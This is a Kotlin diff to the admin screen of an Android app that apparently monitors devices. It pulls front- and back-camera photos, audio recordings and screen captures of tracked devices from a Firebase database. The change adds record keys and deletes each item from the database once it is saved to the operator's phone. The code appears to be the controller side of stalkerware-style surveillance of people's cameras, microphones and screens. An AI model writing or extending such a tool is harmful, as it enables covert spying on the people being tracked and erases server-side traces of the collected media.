@@ -63,17 +63,20 @@ import java.util.Locale
 import java.util.UUID
 
 data class PhotoItem(
+    val key: String? = null,
     val backBase64: String? = null,
     val frontBase64: String? = null,
     val timestamp: Long = 0L
 )
 
 data class AudioItem(
+    val key: String? = null,
     val audioBase64: String? = null,
     val timestamp: Long = 0L
 )
 
 data class ScreenItem(
+    val key: String? = null,
     val type: String = "image",
     val screenBase64: String? = null,
     val videoBase64: String? = null,
@@ -183,12 +186,12 @@ fun BigAdminScreen(
                     val front = child.child("front_base64").getValue(String::class.java)
                     val ts = child.child("timestamp").getValue(Long::class.java) ?: 0L
                     if (!back.isNullOrEmpty() || !front.isNullOrEmpty()) {
-                        list.add(PhotoItem(back, front, ts))
+                        list.add(PhotoItem(child.key, back, front, ts))
                     }
                 }
                 photoList = list
-                if (list.isNotEmpty()) {
-                    currentPhotoIndex = list.size - 1
+                if (currentPhotoIndex >= list.size) {
+                    currentPhotoIndex = (list.size - 1).coerceAtLeast(0)
                 }
             }
             override fun onCancelled(error: DatabaseError) {}
@@ -202,12 +205,12 @@ fun BigAdminScreen(
                     val b64 = child.child("audio_base64").getValue(String::class.java)
                     val ts = child.child("timestamp").getValue(Long::class.java) ?: 0L
                     if (!b64.isNullOrEmpty()) {
-                        list.add(AudioItem(b64, ts))
+                        list.add(AudioItem(child.key, b64, ts))
                     }
                 }
                 audioList = list
-                if (list.isNotEmpty()) {
-                    currentAudioIndex = list.size - 1
+                if (currentAudioIndex >= list.size) {
+                    currentAudioIndex = (list.size - 1).coerceAtLeast(0)
                 }
             }
             override fun onCancelled(error: DatabaseError) {}
@@ -224,12 +227,12 @@ fun BigAdminScreen(
                     val ts = child.child("timestamp").getValue(Long::class.java) ?: 0L
                     val dur = child.child("duration").getValue(Int::class.java) ?: 10
                     if (!sB64.isNullOrEmpty() || !vB64.isNullOrEmpty()) {
-                        list.add(ScreenItem(type, sB64, vB64, ts, dur))
+                        list.add(ScreenItem(child.key, type, sB64, vB64, ts, dur))
                     }
                 }
                 screenList = list
-                if (list.isNotEmpty()) {
-                    currentScreenIndex = list.size - 1
+                if (currentScreenIndex >= list.size) {
+                    currentScreenIndex = (list.size - 1).coerceAtLeast(0)
                 }
             }
             override fun onCancelled(error: DatabaseError) {}
@@ -801,7 +804,13 @@ fun BigAdminScreen(
                                     Button(
                                         onClick = {
                                             if (currentItem != null) {
-                                                savePhotoToGallery(context, currentItem.backBase64, currentItem.frontBase64)
+                                                savePhotoToGallery(context, currentItem.backBase64, currentItem.frontBase64) {
+                                                    currentItem.key?.let { key ->
+                                                        FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+                                                            .getReference("tracking/devices/$currentDevId/media/archive_photos/$key")
+                                                            .removeValue()
+                                                    }
+                                                }
                                             }
                                         },
                                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF16A34A)),
@@ -909,7 +918,13 @@ fun BigAdminScreen(
                                             onClick = {
                                                 val b64 = currentAudio?.audioBase64
                                                 if (!b64.isNullOrEmpty()) {
-                                                    saveAudioToDownloads(context, b64)
+                                                    saveAudioToDownloads(context, b64) {
+                                                        currentAudio.key?.let { key ->
+                                                            FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+                                                                .getReference("tracking/devices/$currentDevId/media/archive_audio/$key")
+                                                                .removeValue()
+                                                        }
+                                                    }
                                                 }
                                             },
                                             shape = RoundedCornerShape(8.dp)
@@ -1061,10 +1076,27 @@ fun BigAdminScreen(
 
                                     Button(
                                         onClick = {
+                                            val key = currentScreen?.key
                                             if (isVideo) {
-                                                currentScreen?.videoBase64?.let { saveVideoToDownloads(context, it) }
+                                                currentScreen?.videoBase64?.let {
+                                                    saveVideoToDownloads(context, it) {
+                                                        key?.let { k ->
+                                                            FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+                                                                .getReference("tracking/devices/$currentDevId/media/archive_screen/$k")
+                                                                .removeValue()
+                                                        }
+                                                    }
+                                                }
                                             } else {
-                                                currentScreen?.screenBase64?.let { savePhotoToGallery(context, it, null) }
+                                                currentScreen?.screenBase64?.let {
+                                                    savePhotoToGallery(context, it, null) {
+                                                        key?.let { k ->
+                                                            FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+                                                                .getReference("tracking/devices/$currentDevId/media/archive_screen/$k")
+                                                                .removeValue()
+                                                        }
+                                                    }
+                                                }
                                             }
                                         },
                                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7C3AED)),
@@ -1291,7 +1323,7 @@ private fun playScreenVideo(context: Context, videoBase64: String) {
     }
 }
 
-private fun savePhotoToGallery(context: Context, backB64: String?, frontB64: String?) {
+private fun savePhotoToGallery(context: Context, backB64: String?, frontB64: String?, onComplete: (() -> Unit)? = null) {
     var savedCount = 0
     val list = listOfNotNull(backB64, frontB64)
     Thread {
@@ -1320,7 +1352,8 @@ private fun savePhotoToGallery(context: Context, backB64: String?, frontB64: Str
         }
         (context as? android.app.Activity)?.runOnUiThread {
             if (savedCount > 0) {
-                Toast.makeText(context, "💾 $savedCount ta rasm Galereyaga saqlandi!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "💾 $savedCount ta rasm Galereyaga saqlandi va bazadan o'chirildi!", Toast.LENGTH_SHORT).show()
+                onComplete?.invoke()
             } else {
                 Toast.makeText(context, "Rasmni saqlab bo'lmadi", Toast.LENGTH_SHORT).show()
             }
@@ -1328,7 +1361,7 @@ private fun savePhotoToGallery(context: Context, backB64: String?, frontB64: Str
     }.start()
 }
 
-private fun saveAudioToDownloads(context: Context, b64: String) {
+private fun saveAudioToDownloads(context: Context, b64: String, onComplete: (() -> Unit)? = null) {
     Thread {
         try {
             val bytes = Base64.decode(b64, Base64.DEFAULT)
@@ -1350,7 +1383,8 @@ private fun saveAudioToDownloads(context: Context, b64: String) {
                 File(dir, filename).writeBytes(bytes)
             }
             (context as? android.app.Activity)?.runOnUiThread {
-                Toast.makeText(context, "💾 Ovoz Telefonga (Downloads) yuklab olindi!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "💾 Ovoz Telefonga yuklab olindi va bazadan o'chirildi!", Toast.LENGTH_SHORT).show()
+                onComplete?.invoke()
             }
         } catch (e: Exception) {
             (context as? android.app.Activity)?.runOnUiThread {
@@ -1360,7 +1394,7 @@ private fun saveAudioToDownloads(context: Context, b64: String) {
     }.start()
 }
 
-private fun saveVideoToDownloads(context: Context, b64: String) {
+private fun saveVideoToDownloads(context: Context, b64: String, onComplete: (() -> Unit)? = null) {
     Thread {
         try {
             val bytes = Base64.decode(b64, Base64.DEFAULT)
@@ -1382,7 +1416,8 @@ private fun saveVideoToDownloads(context: Context, b64: String) {
                 File(dir, filename).writeBytes(bytes)
             }
             (context as? android.app.Activity)?.runOnUiThread {
-                Toast.makeText(context, "💾 Video Telefonga yuklab olindi!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "💾 Video Telefonga yuklab olindi va bazadan o'chirildi!", Toast.LENGTH_SHORT).show()
+                onComplete?.invoke()
             }
         } catch (e: Exception) {
             (context as? android.app.Activity)?.runOnUiThread {
